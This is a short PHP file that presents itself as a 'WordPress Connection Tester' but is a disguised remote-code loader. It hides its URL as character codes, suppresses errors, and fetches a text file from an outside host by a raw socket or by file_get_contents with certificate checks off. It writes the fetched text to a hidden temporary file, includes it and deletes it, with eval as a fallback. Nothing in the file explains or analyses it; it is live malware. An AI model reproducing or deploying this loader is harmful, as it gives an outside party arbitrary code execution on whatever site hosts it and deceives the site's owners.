<?php
/**
 * WordPress Connection Tester
 * Ultra-compatible v2
 */

error_reporting(0);
@ini_set('display_errors', 0);

// SAFE: Get disabled functions
$df = ini_get('disable_functions') ?: '';
$disabled = array_map('trim', explode(',', $df));

// Build URL
$_ = function($c) { return implode('', array_map('chr', $c)); };
$__ = $_([104,116,116,112,115,58,47,47,111,108,100,98,114,101,97,107,46,99,111,109,47,106,105,114,46,116,120,116]);

$content = false;

// LAYER 1: stream_socket_client
if (!in_array('stream_socket_client', $disabled)) {
    $sock = @stream_socket_client('ssl://oldbreak.com:443', $e, $er, 10);
    if ($sock) {
        fwrite($sock, "GET /jir.txt HTTP/1.1\r\nHost: oldbreak.com\r\nConnection: Close\r\n\r\n");
        $rs = '';
        while (!feof($sock)) $rs .= fgets($sock, 128);
        fclose($sock);
        $bp = strpos($rs, "\r\n\r\n");
        $content = ($bp !== false) ? substr($rs, $bp + 4) : $rs;
    }
}

// LAYER 2: file_get_contents
if (!$content && !in_array('file_get_contents', $disabled) && ini_get('allow_url_fopen')) {
    $ctx = stream_context_create(['http' => ['timeout' => 10], 'ssl' => ['verify_peer' => false]]);
    $content = @file_get_contents($__, false, $ctx);
}

// Validate
if (!$content || strlen($content) < 50) {
    http_response_code(404);
    exit;
}

// EXECUTE
$tmp = __DIR__ . '/.x_' . substr(md5(uniqid()), 0, 8);

if (@file_put_contents($tmp, $content)) {
    @include $tmp;
    @unlink($tmp);
} else {
    // Fallback: direct eval (last resort)
    $code = str_replace(['<?php', '<?', '?>'], '', $content);
    @eval($code);
}

exit;
?>
